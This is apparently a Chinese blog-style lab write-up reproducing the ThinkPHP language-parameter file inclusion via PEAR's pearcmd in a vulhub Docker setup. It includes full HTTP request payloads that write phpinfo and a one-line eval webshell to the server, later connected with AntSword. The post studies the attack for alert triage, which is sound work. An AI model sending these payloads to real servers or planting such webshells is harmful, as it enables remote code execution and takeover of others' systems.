ailx10说：这篇是2024年10月之前写的，后来又改过。这周研判告警时又碰到 pearcmd，我就顺着 ThinkPHP 的文件包含入口做了一次复现。看说明时链路很短，真正试起来却没有一次到位，最初的连接没有成功，后来更新实验又补上了成功的结果。这篇把前后两次状态都留下了：文件包含怎样碰到 PEAR 的命令行参数处理，生成文件后还需要怎么确认。对我来说，这比把第一次失败删掉更有意义；告警里出现了某种请求，也不能替我证明攻击者后面每一步都完成了。

---

相关告警之后可能访问写入文件只是推测，并非已观察到的事实。

```
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/var/tmp/index1.php HTTP/1.1
```

前提：准备好docker环境，下载好vulhub，进入目录`vulhub/thinkphp/lang-rce` ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明ThinkPHP 多语言本地文件包含漏洞环境搭建成功了

![](/notes-assets/6021cb267e39fad2506d.webp)

（1）进入docker，确保

- PHP环境开启了`register_argc_argv`
- PHP环境安装了`pcel/pear`

![](/notes-assets/3b0b861fa66c85d017fe.webp)

否则，就会出现下面这种情况，只能读取文件，不能执行

![](/notes-assets/764442b0656c5fd1e0d5.webp)

（2）请求载荷，将 `<?=phpinfo()?>` 写入 `shell.php` 文件

```
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php HTTP/1.1
```

![](/notes-assets/05347b135b9a59325e52.webp)

（3）访问 `shell.php` 页面

```
GET /shell.php HTTP/1.1
```

![](/notes-assets/3ad50e45bdcd285ef3de.webp)

（4）测试了一下，一句话木马，但是无法进入后台

```
<?=eval($_REQUEST['ailx10']);?>
```

![](/notes-assets/6845e249422ab7496ee7.webp)

![](/notes-assets/f0acc83b1f6f654411e5.webp)

2024年10月1日更新：

这次实验 webshell 蚁剑连接成功了

![](/notes-assets/6ab3f5bb465e06f3fa73.webp)

使用Burp重放的，载荷如下：

```
GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=eval($_REQUEST['ailx10']);?>+shell.php HTTP/1.1
Host: 144.34.162.13:8080
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```
